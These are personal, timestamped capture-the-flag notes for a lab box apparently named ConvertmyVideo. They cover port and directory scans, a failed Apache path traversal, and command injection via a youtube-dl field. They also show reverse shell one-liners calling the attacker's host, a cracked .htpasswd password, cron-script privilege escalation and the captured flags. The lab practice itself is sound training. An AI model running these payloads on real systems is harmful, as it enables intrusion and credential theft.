```
ConvertmyVideo Attempt 1
IP: 10.10.249.191
```

```
1:14 PM 1/13/2023
nmap -sC -sV -oA namp 10.10.249.191

				PORT   STATE SERVICE VERSION
				22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
				| ssh-hostkey: 
				|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
				|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
				|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
				80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
				|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
				|_http-server-header: Apache/2.4.29 (Ubuntu)
				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

nmap -sC -sV -p- 10.10.249.191
```

```
1:16 PM 1/13/2023
dirsearch -u http://10.10.249.191:80 -x 400,401,403 

			Target: http://10.10.249.191:80/

			[18:16:20] Starting: 
			[18:16:23] 301 -  311B  - /js  ->  http://10.10.249.191/js/
			[####                ] 21%   2340/1092[####                ] 21%   2341/1092[####                ] 21%   2342/1092[####                ] 21%   2343/1092[####                ] 21%   2344/1092[####                ] 21%   2345/1092[###[18:17:13] 301 -  315B  - /images  ->  http://10.10.249.191/images/
			[18:17:14] 200 -  747B  - /index.php
			[18:17:14] 200 -  747B  - /index.php/login/
			[18:17:37] 301 -  312B  - /tmp  ->  http://10.10.249.191/tmp/

			Task Completed
```

```
1:29 PM 1/13/2023
found exploit doing research on how to use it https://www.exploit-db.com/exploits/50383

curl -s --path-as-is "http://10.10.249.191:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

curl -s --path-as-is "http://10.10.249.191:80/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

1 http://$host/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
2 http://$host/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
3 http://$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
4 http://$host/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
5 http://10.10.249.191:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh


curl --data "A=|echo;id>" 'http://10.10.249.191:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -vv

curl --path-as-is "http://10.10.249.191:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

```
2:04 PM 1/13/2023
stuck, going to watch walklthrough.
 exploit never worked.
```

```
3:15 PM 1/13/2023
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

echo nc -nv 192.168.1.23 4446 -e /bin/bash > shell.sh # going to move reverse shell onto server

 python3 -m http.server  

wget${IFS}http://10.13.13.125:8000/smh.sh # worked,

going to chmod

chmod${IFS}777${IFS}smh.sh# worked 2


echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.13.13.125 1234 >/tmp/f” > shell.sh # had to uplad into the new shell.sh my shell didnt work.

;./shell.sh.3;



;ls	-la;


version;cat${IFS}/var/www/html/admin/flag.txt;




version;ls${IFS}/var/www/html;chmod${IFS}777${IFS}smh.sh;
```

```
4:40 PM 1/13/2023
new IP: 10.10.162.195
```

```
4:52 PM 1/13/2023
;ls${IFS}-la${IFS}/var/www/html/admin;

	{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";ls${IFS}-la${IFS}\/var\/www\/html\/admin;","output":"total 24\ndrwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .\ndrwxr-xr-x 6 www-data www-data 4096 Apr 12  2020 ..\n-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess\n-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd\n-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt\n-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php\n","result_url":"\/tmp\/downloads\/63c218a1ec62a.mp3"}

cat ${IFS}/var/www/html/admin/flag.txt;
	
	{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";cat${IFS}\/var\/www\/html\/admin\/flag.txt;","output":"flag{0d8486a0c0c42503bb60ac77f4046ed7}\n","result_url":"\/tmp\/downloads\/63c219169f3a7.mp3"}
	
	flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

```	
4:54 PM 1/13/2023
;cat${IFS}/var/www/html/admin/.htpasswd;

	{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";cat${IFS}\/var\/www\/html\/admin\/.htpasswd;","output":"itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y\/\n","result_url":"\/tmp\/downloads\/63c219709b683.mp3"}
	
	going to try to ssh, and break password
	itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y\/\n
```

```
5:12 PM 1/13/2023
going to try to put up a reverse shell one more time.

wget${IFS}http://10.13.13.125:8000/lol.sh

;chmod${IFS}777${IFS}lol.sh;


;ls${IFS}-la${IFS}lol.sh;

	{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";ls${IFS}-la${IFS}lol.sh;","output":"-rwxrwxrwx 1 www-data www-data 43 Jan 14 02:00 lol.sh\n","result_url":"\/tmp\/downloads\/63c21e70b9605.mp3"}
```

```	
5:18 PM 1/13/2023
;bash${IFS}lol.sh;

			listening on [any] 1234 ...
			connect to [10.13.13.125] from (UNKNOWN) [10.10.162.195] 55908
			bash: cannot set terminal process group (833): Inappropriate ioctl for device
			bash: no job control in this shell
			www-data@dmv:/var/www/html$ whoami
			whoami
			www-data
			www-data@dmv:/var/www/html$ ^C
On box finally.
```

```
5:24 PM 1/13/2023
pulling over linpeas

┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server

www-data@dmv:/var/www/html$ wget http://10.13.13.125:8000/linpeas.sh

							Connecting to 10.13.13.125:8000... connected.
							HTTP request sent, awaiting response... 200 OK
							Length: 828087 (809K) [text/x-sh]
							Saving to: 'linpeas.sh'

								 0K .......... .......... .......... .......... ..........  6%  114K 7s
								50K .......... .......... .......... .......... .......... 12%  239K 5s
							   100K .......... .......... .......... .......... .......... 18%  261K 4s
							   150K .......... .......... .......... .......... .......... 24%  241K 3s
							   200K .......... .......... .......... .......... .......... 30%  793K 2s
							   250K .......... .......... .......... .......... .......... 37%  274K 2s
							   300K .......... .......... .......... .......... .......... 43%  237K 2s
							   350K .......... .......... .......... .......... .......... 49%  241K 2s
							   400K .......... .......... .......... .......... .......... 55%  234K 2s
							   450K .......... .......... .......... .......... .......... 61%  237K 1s
							   500K .......... .......... .......... .......... .......... 68%  239K 1s
							   550K .......... .......... .......... .......... .......... 74%  238K 1s
							   600K .......... .......... .......... .......... .......... 80%  241K 1s
							   650K .......... .......... .......... .......... .......... 86%  274K 0s
							   700K .......... .......... .......... .......... .......... 92% 1.27M 0s
							   750K .......... .......... .......... .......... .......... 98%  292K 0s
							   800K ........                                              100% 9.09M=3.2s

							2023-01-14 03:23:48 (256 KB/s) - 'linpeas.sh' saved [828087/828087]
```

```
5:27 PM 1/13/2023
nothing popped from linpeas. going to check out this file /var/www/html/tmp/clean.sh
```

```
5:37 PM 1/13/2023
www-data@dmv:/var/www/html/admin$ cat .htpasswd
cat .htpasswd
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/

revisiting passwd.
```

```
5:39 PM 1/13/2023
john --wordlist=/usr/share/wordlists/rockyou.txt itsmeadmin.txt 

			Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
			Use the "--format=md5crypt-long" option to force loading these as that type instead
			Using default input encoding: UTF-8
			Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
			Will run 4 OpenMP threads
			Press 'q' or Ctrl-C to abort, almost any other key for status
			jessie           (?)     
			1g 0:00:00:00 DONE (2023-01-13 22:39) 100.0g/s 38400p/s 38400c/s 38400C/s alyssa..michael1
			Use the "--show" option to display all of the cracked passwords reliably
			Session completed. 

#CRACKD!!!
```

```
5:39 PM 1/13/2023
going to try to ssh in. - did not work. echoing a shell into a script that is being rujn as root and executable as www-date to priv esc.

echo 'bash -i >& /dev/tcp/10.13.13.125/1234 0>&1' > clean.sh
```

```
5:59 PM 1/13/2023
		└─# nc -lvnp 1234
		listening on [any] 1234 ...
		connect to [10.13.13.125] from (UNKNOWN) [10.10.162.195] 56108
		bash: cannot set terminal process group (31501): Inappropriate ioctl for device
		bash: no job control in this shell
		root@dmv:/var/www/html/tmp# ls

setup nc after clean.sh script
```

```
5:58 PM 1/13/2023
root@dmv:~# cat root.txt
cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}




flag{0d8486a0c0c42503bb60ac77f4046ed7}
```
